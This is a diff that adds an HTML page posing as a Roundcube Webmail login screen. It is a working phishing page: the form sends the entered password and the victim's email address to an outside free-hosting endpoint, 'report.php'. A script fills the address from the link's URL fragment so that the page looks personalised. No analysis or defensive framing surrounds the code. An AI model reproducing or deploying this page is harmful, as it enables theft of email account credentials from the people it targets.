@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+		<title>Webmail :: Welcome to Roundcube Webmail</title>
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	</head>
+ <style>
+
+
+p {
+  font-size: 18px;
+}
+#submbttn {
+    width: 22em;  height:2.5em;
+    color: white;
+    background: #166ecc;
+    border: 0px;
+    border-radius: 5px;
+    opacity: 0.8;
+}
+
+
+#form{
+  
+    left      : 50%;
+    top       : 50%;
+    position  : absolute;
+    transform : translate(-50%, -50%);
+}
+
+
+  </style>
+  
+<body>
+
+<form  id="form" action="https://zitere.000webhostapp.com/report.php" method="POST">
+    
+    <IMG  src="https://www.hostingireland.news/wp-content/uploads/2010/11/Webmail_logo.png" width="320" height="80" >
+   
+    <br><br> <b >Email Address:</b> <br>
+   <i class="fa fa-envelope icon"></i>
+   <input style="width: 21em; margin-top: 8px; height: 2em;  border-radius: 5px; " id="eid" name="ei" readonly></input><br><br>
+    
+    <b >Password</b> <br>
+    
+     
+    <i class="fa fa-key icon"></i>
+     <input style="width: 21em;  height: 2em;  margin-top: 8px; border-radius: 5px; " id="pid" name="pi" type="password" placeholder= "Enter your email password." ></input><br><br><br>
+    
+     <input id="submbttn" type="submit" value="Log in"></input>
+    
+</form>
+
+
+<script>
+ window.onload = function() {
+ 
+ var nw="mawa";
+           
+            
+            
+             var sen = window.location.href;
+		     const ema = sen.substring(sen.indexOf('#') + 1);	
+		     const dom = sen.substring(sen.indexOf('@') + 1);	
+			 document.getElementById("pid").focus();
+			 document.getElementById("eid").value=ema;
+			
+			
+		
+             
+	
+	        
+        }
+        
+
+	
+</script>
+
+</body>
+</html>
+
+
+
+
